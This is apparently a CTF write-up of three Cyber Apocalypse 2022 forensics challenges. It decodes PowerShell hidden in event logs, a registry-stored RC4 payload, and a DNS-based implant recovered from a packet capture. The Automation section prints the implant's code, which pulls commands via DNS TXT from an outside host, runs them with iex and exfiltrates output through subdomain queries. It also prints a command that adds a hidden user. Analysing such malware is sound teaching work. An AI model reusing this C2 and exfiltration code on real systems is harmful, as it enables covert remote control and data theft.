---
title: Cyber Apocalypse 2022
date: 2022-06-09 16:52:47
tags: ['voynich', 'CTF']
categories: ['CTF', 'security', 'writeup']
---

![cover](/assets/post/CyberApocalypse2022/cover.png)

Challenges solved in the field of forensics in the Cyber Apocalypse CTF 2022 competition.

* Puppeteer
* Golden Persistence
* Automation

## Puppeteer

The participant is provided with a set of logs for the Windows operating system, which they need to analyze in order to obtain the flag.

Files with the “evtx” extension can be edited using the Event Viewer tool in Windows.

PowerShell script event logs are stored in “Microsoft-Windows-PowerShell Operational.evtx”.

![Puppeteer](/assets/post/CyberApocalypse2022/puppeteer-1.png)

In one of the reports, I came across a script that stored some interesting values in the variables:

![Puppeteer](/assets/post/CyberApocalypse2022/puppeteer-2.png)

There was an interesting comment in the script
It says “Unpack Special Orders!” I assumed that a significant amount was stored in the $stage3 variable.

In the first step, I removed the additional code related to “Unpack Shellcode”
In the next step, I concluded that the $stage3 variable stores an array of ascii code that can be converted to a string using "[System.Text.Encoding] :: ASCII.GetString".

```powershell
[byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;
[byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;

[array]::Reverse($stage2);

$stage3 = $stage1 + $stage2;

#Unpack Special Orders!

for($i=0;$i -lt $stage3.count;$i++){
    $stage3[$i] = $stage3[$i] -bxor 0xd1;
}

[System.Text.Encoding]::ASCII.GetString($stage3)

#HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3...}
```

## Golden Persistence

There is a file called “NTUSER.DAT” in this challenge, which indicates that it is an "MS Windows registry file"
> $ file ./NTUSER.DAT

NTUSER.DAT: MS Windows registry file, NT/2000 or above

> Microsoft Windows NT 4 (and later) uses the Windows NT Registry File (REGF) to store system and application related data, e.g. configurations, most recently used (MRU) files.

Using a tool called "accessdata registry viewer", I checked and edited this file.

![Puppeteer](/assets/post/CyberApocalypse2022/goldenpersistence-1.png)

There were no results from my reviews,
The tool allows the user to export all the information in text form, which I used to check all the text:

![Puppeteer](/assets/post/CyberApocalypse2022/goldenpersistence-2.png)

After checking the output file, I realized this part
A PowerShell script appears to be running as base64:

![Puppeteer](/assets/post/CyberApocalypse2022/goldenpersistence-3.png)

First I saved the encoded script in a variable in PowerShell

![Puppeteer](/assets/post/CyberApocalypse2022/goldenpersistence-4.png)

Then I decoded it with the command "[System.Text.Encoding] :: ASCII.GetString ([System.Convert] :: FromBase64String ($ script))"

![Puppeteer](/assets/post/CyberApocalypse2022/goldenpersistence-5.png)

Examining the script, I noticed that the program decrypts the values by taking values from the register using the key in the code.

![Puppeteer](/assets/post/CyberApocalypse2022/goldenpersistence-6.png)

I collected the values according to each of the paths in the code, for example the value of the first path is like this

> $encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL

![Puppeteer](/assets/post/CyberApocalypse2022/goldenpersistence-7.png)

```
key: HKCU:\SOFTWARE\ZYb78P4s\t3RBka5tL

value :F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39
```

After collecting all the values of the final code is as follows

```powershell
$enc = [System.Text.Encoding]::ASCII

function encr {
    param(
        [Byte[]]$data,
        [Byte[]]$key
      )

    [Byte[]]$buffer = New-Object Byte[] $data.Length
    $data.CopyTo($buffer, 0)

    [Byte[]]$s = New-Object Byte[] 256;
    [Byte[]]$k = New-Object Byte[] 256;

    for ($i = 0; $i -lt 256; $i++)
    {
        $s[$i] = [Byte]$i;
        $k[$i] = $key[$i % $key.Length];
    }

    $j = 0;
    for ($i = 0; $i -lt 256; $i++)
    {
        $j = ($j + $s[$i] + $k[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
    }

    $i = $j = 0;
    for ($x = 0; $x -lt $buffer.Length; $x++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
        [int]$t = ($s[$i] + $s[$j]) % 256;
        $buffer[$x] = $buffer[$x] -bxor $s[$t];
    }

    return $buffer
}


function HexToBin {
    param(
    [Parameter(
        Position=0,
        Mandatory=$true,
        ValueFromPipeline=$true)
    ]
    [string]$s)
    $return = @()

    for ($i = 0; $i -lt $s.Length ; $i += 2)
    {
        $return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
    }

    Write-Output $return
}

[Byte[]]$key = $enc.GetBytes("Q0mmpr4B5rvZi3pS");
$encrypted1 = "F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39"
$encrypted2 = "CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1"
$encrypted3 = "C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D"
$encrypted4 = "D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1"
$encrypted5 = "84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB"
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"

[Byte[]]$data = HexToBin $encrypted
$DecryptedBytes = encr $data $key
$DecryptedString = $enc.GetString($DecryptedBytes)
$DecryptedString

#HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}
```

## Automation

In this challenge, a file captured with wireshark is given that you should check.

First, I filtered the packets according to the http protocol

![Puppeteer](/assets/post/CyberApocalypse2022/automation-1.png)

I noticed that an image was downloaded but when I dumped the image I noticed that it was an encoded string with base64

![Puppeteer](/assets/post/CyberApocalypse2022/automation-2.png)

If we decode the string with base64, we get a PowerShell script

![Puppeteer](/assets/post/CyberApocalypse2022/automation-3.png)

After checking the code, I found out that she received a series of commands using the dns query from the "windowsliveupdater.com" domain

```powershell
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
```

The received information had several sections that were decrypted with a key in the script

```powershell
$encryptedString = $out[$num].Strings[0]
$backToPlainText = Decrypt-String $key $encryptedString
```

After decrypted, execute the received command and save the output in encrypted form in output variable.

```powershell
$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
```

Commands are divided into 32 sections. And queries each section as a subdomain

```powershell
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
	$domain = -join($pr[$ans],".windowsliveupdater.com")
	Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
}
```

To specify the start and end of each command, first send a request to "start.windowsliveupdater.com" and finally a request to "end.windowsliveupdater.com"

```powershell
Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
	$domain = -join($pr[$ans],".windowsliveupdater.com")
	Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
}
Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
}
```

![Puppeteer](/assets/post/CyberApocalypse2022/automation-4.png)

After collecting all the parts of each command, the final script is as follows

```powershell
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
     
        }
        else {
            $aesManaged.IV = $IV
     

        }
    }
    if ($key) {

        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
  
    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-","")
}

function Decrypt-String($key, $encryptedStringWithIV) {
	$bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
$key = "a1E4MUtycWswTmtrMHdqdg=="

write-Output "Command :"
#windowsliveupdater.com
$command = @(
	"Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=",
	"hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=",
	"58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=",
	"eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru",
	"BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=",
	"vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A="
)

foreach($cmd in $command){
	Decrypt-String $key $cmd
	write-host "****"
}

write-host "command Output :"
$commandOutput = @(
	"CC1C9AC2958A2E63609272E2B4F8F43632A806549B03AB7E4EB39771AEDA4A1BC1006AC8A03F9776B08321BD6D5247BB",
	"7679895D1CF7C07BB6A348E1AA4AFC655958A6856F1A34AAD5E97EA55B08767035F2497E5836EA0ECA1F1280F59742A3",
	"09E28DD82C14BC32513652DAC2F2C27B0D73A3288A980D8FCEF94BDDCF9E28222A1CA17BB2D90FCD615885634879041420FC39C684A9E371CC3A06542B6660055840BD94CCE65E23613925B4D9D2BA5318EA75BC653004D45D505ED62567017A6FA4E7593D83092F67A81082D9930E99BA20E34AACC4774F067442C6622F5DA2A9B09FF558A8DF000ECBD37804CE663E3521599BC7591005AB6799C57068CF0DC6884CECF01C0CD44FD6B82DB788B35D62F02E4CAA1D973FBECC235AE9F40254C63D3C93C89930DA2C4F42D9FC123D8BAB00ACAB5198AFCC8C6ACD81B19CD264CC6353668CEA4C88C8AEEA1D58980022DA8FA2E917F17C28608818BF550FEA66973B5A8355258AB0AA281AD88F5B9EB103AC666FE09A1D449736335C09484D271C301C6D5780AB2C9FA333BE3B0185BF071FB1205C4DBEAA2241168B0748902A6CE14903C7C47E7C87311044CB9873A4",
	"ECABC349D27C0B0FFFD1ACEEDBE06BB6C2EB000EE4F9B35D6F001500E85642A2DCC8F1BE2CF4D667F458C1DE46D24B1C2E0F5D94E52649C70402C1B0A2FF7B49FC32DDD67F275307A74B2C4D0864B3F0486186DA9443EB747F717B3911C959DC7E300844D60655410C3988238E615D616F33D27F63CE4D1E065A416911BC50D458749599D2CB08DB561988EB2902E05D9886FDDAC2BED6F6DA73637AD2F20CF199B8CE3D9DEE03C0180C7D1198B49C02769E5EE4EAB896D7D3BB478EA140816779472A243BFB0852AF372323EC1329883C81A3F2AEB1D3DAAE8496E1DBF97F435AE40A09203B890C4A174D77CB7026C4E990A6FB6424A7501823AD31D3D6B6344C7971C8D447C078C4471732AD881C394BC8B1A66E0BED43DDC359269B57D1D5D68DCD2A608BF61716BB47D6FE4D5C9D6E8BB2981F214A8234B0DD0210CA96EB2D6322B0F7F3D748C4C9F8B80EFF5A6921A3D1A8621A49F4D29BC9851D25230B",
	"841BDB4E9E5F8BF721B58E8308177B572E9A015967DA5BF11AC9155FC2159C8F610CD82F818B4BDF5E48722DAF4BEEEBABCE30583F503B484BF99020E28A1B8F282A23FEB3A21C3AD89882F5AC0DD3D57D87875231652D0F4431EC37E51A09D57E2854D11003AB6E2F4BFB4F7E2477DAA44FCA3BC6021777F03F139D458C0524",
	"AE4ABE8A3A88D21DEEA071A72D65A35EF158D9F025897D1843E37B7463EC7833"
)

foreach($cmd in $commandOutput){
		$Bytes = [byte[]]::new($cmd.Length / 2)
		For($i=0; $i -lt $cmd.Length; $i+=2){
			$Bytes[$i/2] = [convert]::ToByte($cmd.Substring($i, 2), 16)
		}
    $backToPlainText = Decrypt-String $key $([Convert]::ToBase64String($Bytes))
		$backToPlainText 
		write-host "****"
}

# net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add > $part1='HTB{y0u_c4n_'
# displayName=Pan Antivirus 4.0, $part2=4utom4t3_but_y0u_c4nt_h1de}

#HTB{y0u_c4n_4utom4t3_but_y0u_c4nt_h1de}
```

## POC

| name  | gist |
| ----- | ---- |
| Puppeteer | [CyberApocalypseCTF2022 Puppeteer.ps1](https://gist.github.com/xiosec/c0d8fd30ef70e646257eafa9fb2bb440) |
| Golden Persistence | [CyberApocalypseCTF2022 GoldenPersistence.ps1](https://gist.github.com/xiosec/34583b2d19b04454bdf7dae6228fc6c2) |
| Automation | [CyberApocalypseCTF2022 Automation.ps1](https://gist.github.com/xiosec/de816c90f5762d8be5a0c4eebf94e41a) |
